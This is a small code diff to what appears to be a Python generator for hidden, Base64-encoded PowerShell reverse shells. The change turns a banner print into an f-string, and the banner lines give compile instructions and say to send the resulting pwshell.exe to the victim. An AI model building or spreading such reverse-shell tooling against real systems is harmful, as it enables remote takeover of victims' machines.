@@ -3,7 +3,10 @@ def zerotechnique():
 def printtechnique(technique):
     print("\n[+] Hidden Process Base64 Encoded Powershell Reverse Shell generated                [+]")
     print("\n[+] How to compile : gcc lib/decode.c lib/pwshell.c -o pwshell                      [+]\n")
-    print("[+]                     Technique = " + technique + "                                          [+]\n")
+    print(
+        f"[+]                     Technique = {technique}"
+        + "                                          [+]\n"
+    )
     print("[+] After compiling you can send the reverse shell(pwshell.exe) to the victim       [+]\n")
 
 def strstr(lhost, lport):
